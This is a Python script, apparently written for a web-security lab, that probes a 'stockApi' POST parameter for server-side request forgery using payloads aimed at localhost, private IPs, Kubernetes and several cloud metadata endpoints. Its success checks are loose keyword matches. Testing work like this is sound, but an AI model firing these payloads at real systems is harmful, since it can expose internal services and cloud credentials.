import requests
from urllib.parse import urljoin
import concurrent.futures

payloads = [
    # Localhost and internal IPs
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",  # IPv6 localhost

    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",

    # Google Cloud metadata
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://metadata.google.internal/computeMetadata/v1/instance/hostname",

    # DigitalOcean metadata
    "http://169.254.169.254/metadata/v1.json",

    # Alibaba Cloud metadata
    "http://100.100.100.200/latest/meta-data/",
    
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    
    # Kubernetes metadata
    "http://kubernetes.default.svc.cluster.local",
    
    # Common private IP ranges
    "http://192.168.0.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    
    # Specific admin interface access
    "http://localhost/admin"
]

def check_ssrf(base_url):
    """
    Checks for SSRF vulnerabilities on the given base URL using a list of payloads.
    
    Args:
        base_url (str): The base URL to test for SSRF vulnerabilities.
    
    Returns:
        tuple: A tuple containing a boolean indicating if vulnerabilities were found and a description string.
    """
    results = []

    def analyze_response(response, url, payload=None):
        """
        Analyzes the response to determine if it indicates an SSRF vulnerability.
        
        Args:
            response (requests.Response): The HTTP response object.
            url (str): The URL that was tested.
            payload (str, optional): The payload used in the test.
        
        Returns:
            str: A message indicating the detected SSRF vulnerability, or None if no vulnerability is detected.
        """
        if response.status_code == 200:
            if "Admin interface" in response.text or "/admin/delete?username=carlos" in response.text:
                return f"Admin interface accessed via SSRF: {url} with payload {payload}"
            elif "Welcome" in response.text or "admin" in response.text.lower():
                return f"Admin interface accessed via SSRF: {url} with payload {payload}"
            elif "metadata" in response.text:
                return f"AWS metadata accessed via SSRF: {url} with payload {payload}"
            elif "project-id" in response.text or "hostname" in response.text:
                return f"Google Cloud metadata accessed via SSRF: {url} with payload {payload}"
            elif "kubernetes" in response.text:
                return f"Kubernetes metadata accessed via SSRF: {url} with payload {payload}"
        return None

    def test_ssrf_post(base_url):
        """
        Tests for SSRF vulnerabilities using POST requests with various payloads.
        
        Args:
            base_url (str): The base URL to test.
        
        Returns:
            list: A list of detected SSRF vulnerabilities from the test.
        """
        test_results = []
        for payload in payloads:
            data = {"stockApi": payload}
            try:
                response = requests.post(base_url, data=data, timeout=5)
                result = analyze_response(response, base_url, payload)
                if result:
                    test_results.append(result)
            except requests.RequestException as e:
                test_results.append(f"Error testing URL: {base_url} with payload {payload}, {e}")
        return test_results

    # Adjusted threading logic to ensure proper result collection
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        future_to_url = {executor.submit(test_ssrf_post, base_url): base_url}
        for future in concurrent.futures.as_completed(future_to_url):
            results.extend(future.result())

    if results:
        return True, "\n".join(results)
    else:
        return False, "No SSRF vulnerabilities detected."

if __name__ == "__main__":
    target_url = input('Enter the URL to test for SSRF vulnerability: ')
    vulnerabilities_found, description = check_ssrf(target_url)
    print(description)
